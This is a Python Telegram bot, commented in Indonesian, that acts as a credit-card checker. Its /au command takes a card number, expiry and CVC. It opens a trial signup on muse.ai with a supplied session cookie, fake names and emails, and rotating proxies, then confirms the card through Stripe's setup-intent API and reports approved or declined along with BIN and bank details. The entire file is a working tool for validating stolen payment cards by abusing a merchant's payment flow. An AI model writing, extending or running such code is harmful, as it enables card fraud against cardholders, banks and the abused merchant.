import httpx
import os
import json
import random
import string
import time
import logging
from urllib.parse import urlencode
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# --- KONFIGURASI DIBACA DARI ENVIRONMENT VARIABLES ---
# Secrets ini akan kita atur di GitHub
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
USER_COOKIE = os.getenv('USER_COOKIE')
STRIPE_KEY = os.getenv('STRIPE_KEY')
PROXY_USER = os.getenv('PROXY_USER')
PROXY_PASS = os.getenv('PROXY_PASS')
PROXY_HOST = os.getenv('PROXY_HOST')
PROXY_PORT = os.getenv('PROXY_PORT')

# Validasi bahwa semua secrets ada
if not all([TELEGRAM_BOT_TOKEN, USER_COOKIE, STRIPE_KEY, PROXY_USER, PROXY_PASS, PROXY_HOST, PROXY_PORT]):
    raise ValueError("Satu atau lebih environment variables (secrets) tidak ditemukan!")

# Membuat URL proxy yang lengkap
proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {"http://": proxy_url, "https://": proxy_url}

# Sisanya sama seperti sebelumnya...
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def get_random_user():
    first_name = ''.join(random.choices(string.ascii_lowercase, k=7))
    last_name = ''.join(random.choices(string.ascii_lowercase, k=6))
    random_num = random.randint(10000, 99999)
    email = f"{first_name}.{last_name}{random_num}@yahoo.com"
    full_name = f"{first_name.capitalize()} {last_name.capitalize()}"
    return full_name, email

def get_bin_info(client: httpx.Client, bin_number: str):
    try:
        response = client.get(f'https://data.handyapi.com/bin/{bin_number}', proxies=proxies)
        if response.status_code == 200:
            data = response.json(); country_flag = data.get('Country', {}).get('Flag', '❓')
            return {"brand": data.get('Scheme', 'N/A').upper(), "type": data.get('Type', 'N/A').upper(), "level": data.get('Level', 'N/A').upper(), "bank": data.get('Bank', {}).get('Name', 'N/A').upper(), "country": f"{data.get('Country', {}).get('Name', 'N/A')}[{country_flag}]"}
    except Exception as e:
        logger.error(f"Error fetching BIN info: {e}")
    return {"brand": "N/A", "type": "N/A", "level": "N/A", "bank": "N/A", "country": "N/A"}

def process_card(client: httpx.Client, cc, mm, yy, cvc):
    full_name, email = get_random_user()
    muse_headers = {'Host': 'muse.ai', 'accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/json; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'origin': 'https://muse.ai', 'referer': 'https://muse.ai/join', 'cookie': USER_COOKIE}
    stripe_headers = {'Host': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'Stripe-Version': '2019-05-16'}
    try:
        start_payload = {"email": email, "name": full_name, "trial": 1, "tier": "basic", "cost_month": 16, "duration": 2629800, "access": "", "referral": "", "pm": "", "ab_pricing": 0, "ab_landing": 0}
        response_start = client.post('https://muse.ai/api/pay/start', headers=muse_headers, json=start_payload, timeout=30, proxies=proxies)
        response_start.raise_for_status()
        start_data = response_start.json()
        setup_intent_id, client_secret = start_data.get('id'), start_data.get('secret')
        if not all([setup_intent_id, client_secret]): return {"status": "error", "message": "Failed to get Setup Intent from muse.ai."}
        stripe_payload_data = {'payment_method_data[type]': 'card', 'payment_method_data[billing_details][name]': full_name, 'payment_method_data[billing_details][email]': email, 'payment_method_data[card][number]': cc, 'payment_method_data[card][cvc]': cvc, 'payment_method_data[card][exp_month]': mm, 'payment_method_data[card][exp_year]': yy, 'payment_method_data[payment_user_agent]': 'stripe.js/22a1c02c9a; stripe-js-v3/22a1c02c9a; card-element', 'payment_method_data[time_on_page]': str(random.randint(40000, 90000)), 'expected_payment_method_type': 'card', 'use_stripe_sdk': 'true', 'key': STRIPE_KEY, 'client_secret': client_secret}
        stripe_payload = urlencode(stripe_payload_data)
        response_stripe = client.post(f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm', headers=stripe_headers, content=stripe_payload, timeout=30, proxies=proxies)
        stripe_data = response_stripe.json()
        if stripe_data.get("status") == "succeeded": return {"status": "approved", "code": "succeeded"}
        else:
            decline_code = "unknown_decline"; error = stripe_data.get("error") or stripe_data.get("last_setup_error");
            if error: decline_code = error.get("decline_code", error.get("code", "unknown_decline"))
            return {"status": "decline", "code": decline_code}
    except httpx.HTTPStatusError as e: return {"status": "error", "message": f"HTTP Error: {e.response.status_code} - {e.response.text}"}
    except Exception as e: logger.error(f"Unexpected error in process_card: {e}"); return {"status": "error", "message": f"An unexpected error occurred: {e}"}

async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message, user = update.message, update.message.from_user; card_info = " ".join(context.args)
    if not card_info: await message.reply_text("❌ Format salah.\nContoh: `/au 434769...|01|29|422`", parse_mode='Markdown'); return
    sent_message = await message.reply_text("⏳ Checking...")
    try:
        parts = card_info.replace(' ', '|').replace('/', '|').split('|');
        if len(parts) != 4: await sent_message.edit_text("❌ Format tidak valid."); return
        cc, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = "20" + yy
        with httpx.Client(http2=True) as client:
            result = process_card(client, cc, mm, yy, cvc); bin_info = get_bin_info(client, cc[:6])
        cc_masked = f"{cc[:6]}...{cc[-4:]}"
        if result['status'] == 'approved': status_text, result_text, code_text = "Approved! ✅", "Succeeded", result['code']
        elif result['status'] == 'decline': status_text, result_text, code_text = "Decline! ❌", result['code'], result['code']
        else: status_text, result_text, code_text = "Error! ⚠️", "Processing Error", result['message']
        response_text = f"↬ Secure | Auth ↫\n- - - - - - - - - - - - - - - - - - - - -\n⇻ CC: `{cc_masked}|{mm}|{yy}|{cvc}`\n⇻ Status: {status_text}\n⇻ Result: {result_text}\n⇻ Code: `{code_text}`\n- - - - - - - - - - - - - - - - - - - - -\n⇻ Brand: `{bin_info['brand']}`\n⇻ Type: `{bin_info['type']}`\n⇻ Level: `{bin_info['level']}`\n⇻ Bank: `{bin_info['bank']}`\n⇻ Country: `{bin_info['country']}`\n- - - - - - - - - - - - - - - - - - - - -\n(↯) Checked by: @{user.username or user.first_name}"
        await sent_message.edit_text(response_text, parse_mode='Markdown')
    except Exception as e: logger.error(f"Error in au_command: {e}"); await sent_message.edit_text(f"Terjadi kesalahan internal. Error: {e}")

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("au", au_command))
    print("Bot berjalan...")
    application.run_polling()

if __name__ == '__main__':
    main()
